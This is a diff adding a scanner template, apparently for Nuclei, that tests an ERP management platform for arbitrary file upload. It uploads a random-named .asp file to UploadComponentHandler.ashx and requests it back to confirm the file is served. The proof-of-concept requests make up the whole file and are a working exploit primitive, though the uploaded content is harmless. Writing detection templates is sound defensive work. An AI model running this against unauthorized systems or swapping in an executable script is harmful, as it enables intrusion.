@@ -1,0 +1,54 @@
+id: poc-jintongfang-erp-uploadcomponent-anyfile-upload
+
+info:
+  name: Arbitrary File Upload Vulnerability in ERP Management Cloud Platform
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_text_alphanumeric(5)}}"
+  t2: "{{base64(t1)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/Page/UploadComponent/UploadComponentHandler.ashx"
+    headers:
+      Content-Type: multipart/form-data; boundary=00content0boundary00
+    body: |-
+      --00content0boundary00
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.asp"
+
+      {{t2}}
+      --00content0boundary00--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - ".asp"
+    extractors:
+      - type: regex
+        group: 1
+        internal: true
+        regex:
+          - "\"src\":\"(?P<file>.*?).asp"
+
+  - id: validate-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/{{file}}.asp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
